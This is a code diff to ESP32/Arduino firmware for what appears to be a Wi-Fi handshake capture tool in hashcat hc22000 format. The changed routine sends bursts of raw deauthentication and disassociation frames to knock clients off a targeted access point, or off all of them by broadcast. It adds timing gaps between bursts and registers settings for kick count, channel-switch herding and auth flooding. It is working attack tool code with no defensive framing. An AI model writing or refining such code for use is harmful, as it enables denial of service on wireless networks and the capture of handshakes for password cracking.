@@ -1,5 +1,6 @@
 #include "method_ctx.h"
 #include "../hc22000.h"
+#include "../../core/wsl_bypasser.h"
 #include <Arduino.h>
 #include <string.h>
 
@@ -30,12 +31,16 @@ void ours(const Ctx& ctx) {
         if (ctx.kickStaOk && memcmp(ctx.kickBssid, b.bssid, 6) == 0) {
             for (uint8_t r = 0; r < rounds; r++) {
                 ctx.sendRawMgmt(0xC0, b.bssid, ctx.kickSta);
+                delay(WSLBypasser::burstLegGapMs());
                 ctx.sendRawMgmt(0xA0, b.bssid, ctx.kickSta);
+                if (r + 1 < rounds) delay(WSLBypasser::burstRoundGapMs());
             }
         } else {
             for (uint8_t r = 0; r < rounds; r++) {
                 ctx.sendRawMgmt(0xC0, b.bssid, ctx.bcast);
+                delay(WSLBypasser::burstLegGapMs());
                 ctx.sendRawMgmt(0xA0, b.bssid, ctx.bcast);
+                if (r + 1 < rounds) delay(WSLBypasser::burstRoundGapMs());
             }
         }
         yield();
@@ -45,7 +50,11 @@ void ours(const Ctx& ctx) {
     if (ctx.csaHerd) csaHerd(ctx);
 }
 
-CAP_METHOD_REGISTER("ALL", ours, nullptr, nullptr)
+// RADIO→EDIT knobs this method actually reads from Ctx (0-terminated).
+// 9=KICK N 10=BIDIR 13=CSA 14=AUTH FLOOD 15=REASON 31=BURST
+static const uint8_t oursKnobs[] = {9, 10, 13, 14, 15, 0};
+
+CAP_METHOD_REGISTER("ALL", ours, nullptr, nullptr, oursKnobs)
 
 } // namespace Methods
 } // namespace Cap
